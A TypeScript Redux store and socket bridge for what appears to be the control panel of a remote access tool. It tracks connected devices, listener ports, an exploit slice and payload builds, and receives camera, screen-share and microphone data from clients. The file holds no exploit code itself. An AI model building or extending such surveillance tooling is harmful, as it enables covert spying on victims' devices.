
import { configureStore } from '@reduxjs/toolkit'
import { useEffect } from 'react'
import { backendApi } from './api/backend-api'
import connectionReducer from './slices/connection-slice'
import clientsReducer from './slices/clients-slice'
import listenerReducer from './slices/listener-slice'
import statsReducer from './slices/stats-slice'
import logsReducer from './slices/logs-slice'
import exploitReducer from './slices/exploit-slice'
import buildReducer from './slices/build-slice'
import {
  connectSocket,
  disconnectSocket,
  setSocketListener,
} from '@/lib/socket'
import { setClients, addClient, removeClient } from './slices/clients-slice'
import { setPorts, setError as setListenerError } from './slices/listener-slice'
import { setStats } from './slices/stats-slice'
import { addLog } from './slices/logs-slice'
import { clientData } from './slices/exploit-slice'
import {
  buildStart,
  buildLog,
  buildSuccess,
  buildFailed,
} from './slices/build-slice'
import {
  socketConnected,
  socketDisconnected,
  socketError,
} from './slices/connection-slice'

export const store = configureStore({
  reducer: {
    connection: connectionReducer,
    clients: clientsReducer,
    listener: listenerReducer,
    stats: statsReducer,
    logs: logsReducer,
    exploit: exploitReducer,
    build: buildReducer,
    [backendApi.reducerPath]: backendApi.reducer,
  },
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware().concat(backendApi.middleware),
})

export type RootState = ReturnType<typeof store.getState>
export type AppDispatch = typeof store.dispatch

// ─── useSocketBridge ─────────────────────────────────────────────────────────
// Mounts once inside <Providers> to wire socket events → Redux actions.

export function useSocketBridge() {
  // NOTE: do NOT guard with a ref — React StrictMode (dev) mounts effects
  // twice. A ref guard would skip the re-connect after the first cleanup,
  // leaving the socket disconnected. connectSocket()/disconnectSocket() are
  // idempotent, so it is safe to run on every mount.
  useEffect(() => {
    setSocketListener({
      onConnect: () => store.dispatch(socketConnected()),
      onDisconnect: (reason) => store.dispatch(socketDisconnected(reason)),
      onConnectError: (err) => store.dispatch(socketError(err.message)),
      onEvent: (event, ...args) => {
        switch (event) {
          case 'initial_clients':
            store.dispatch(setClients(args[0] ?? []))
            break
          case 'listeners_update':
            store.dispatch(setPorts(args[0] ?? []))
            break
          case 'listener_error':
            store.dispatch(setListenerError(args[0] ?? null))
            store.dispatch(
              addLog({
                time: new Date().toLocaleTimeString(),
                msg: `Listener error: ${args[0]?.message ?? ''}`,
                type: 'err',
              }),
            )
            break
          case 'client_connected':
            store.dispatch(addClient(args[0]))
            store.dispatch(
              addLog({
                time: new Date().toLocaleTimeString(),
                msg: `Device connected: ${args[0]?.id}`,
                type: 'ok',
              }),
            )
            break
          case 'client_disconnected':
            store.dispatch(removeClient(args[0]))
            store.dispatch(
              addLog({
                time: new Date().toLocaleTimeString(),
                msg: `Device disconnected: ${args[0]}`,
                type: 'err',
              }),
            )
            break
          case 'client_data':
            if (args[0]?.id && args[0]?.data) {
              store.dispatch(
                clientData({ id: args[0].id, data: args[0].data }),
              )
              // surface keyless events (camera/screen/mic_chunk) silently, but
              // log structural events the user cares about
              const t = args[0].data.type
              if (
                !['camera', 'screen_share', 'mic_chunk'].includes(t)
              ) {
                store.dispatch(
                  addLog({
                    time: new Date().toLocaleTimeString(),
                    msg: `← ${args[0].id}: ${t}`,
                    type: 'info',
                  }),
                )
              }
            }
            break
          case 'sys_log':
            store.dispatch(addLog(args[0]))
            break
          case 'stats_update':
            store.dispatch(setStats(args[0]))
            break
          case 'build_log':
            store.dispatch(buildLog(args[0]))
            break
          case 'build_success':
            store.dispatch(buildSuccess(args[0]))
            store.dispatch(
              addLog({
                time: new Date().toLocaleTimeString(),
                msg: `BUILD SUCCESS: ${args[0]}`,
                type: 'ok',
              }),
            )
            break
          case 'build_failed':
            store.dispatch(buildFailed(args[0]))
            store.dispatch(
              addLog({
                time: new Date().toLocaleTimeString(),
                msg: `BUILD FAILED: ${args[0]}`,
                type: 'err',
              }),
            )
            break
        }
      },
    })

    connectSocket()
    return () => {
      disconnectSocket()
    }
  }, [])
}
